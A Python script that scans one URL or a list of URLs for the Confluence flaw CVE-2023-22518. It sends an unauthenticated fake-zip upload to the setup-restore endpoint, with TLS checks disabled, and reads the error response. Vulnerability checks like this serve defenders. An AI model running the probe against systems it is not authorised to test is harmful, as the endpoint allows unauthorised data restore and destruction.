import requests
import random
import string
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def random_string(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def post_setup_restore(url):
    url = f"{url.rstrip('/')}/json/setup-restore.action"

    headers = {
        "X-Atlassian-Token": "no-check",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7"
    }

    rand_str = random_string()
    data = (
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"buildIndex\"\r\n\r\n"
        "true\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        f"Content-Disposition: form-data; name=\"file\";filename=\"{rand_str}.zip\"\r\n\r\n"
        f"{rand_str}\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"edit\"\r\n\r\n"
        "Upload and import\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n"
    )

    try:
        response = requests.post(url, headers=headers, data=data.encode('utf-8'), timeout=10, verify=False)

        if (response.status_code == 200 and
            'The zip file did not contain an entry' in response.text and 
            'exportDescriptor.properties' in response.text):
            print(f"[+] Vulnerable to CVE-2023-22518 on host {url}!")
        else:
            print(f"[-] Not vulnerable to CVE-2023-22518 for host {url}.")
    except requests.RequestException as e:
        print(f"[*] Error connecting to {url}. Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Post setup restore script")
    parser.add_argument('--url', help='The URL to target', required=False)
    parser.add_argument('--file', help='Filename containing a list of URLs', required=False)
    args = parser.parse_args()

    if args.url:
        post_setup_restore(args.url)
    elif args.file:
        with open(args.file, 'r') as f:
            for line in f:
                url = line.strip()
                if url:
                    post_setup_restore(url)
    else:
        print("You must provide either --url or --file argument.")

if __name__ == "__main__":
    main()

# Ref - https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-22518.yaml
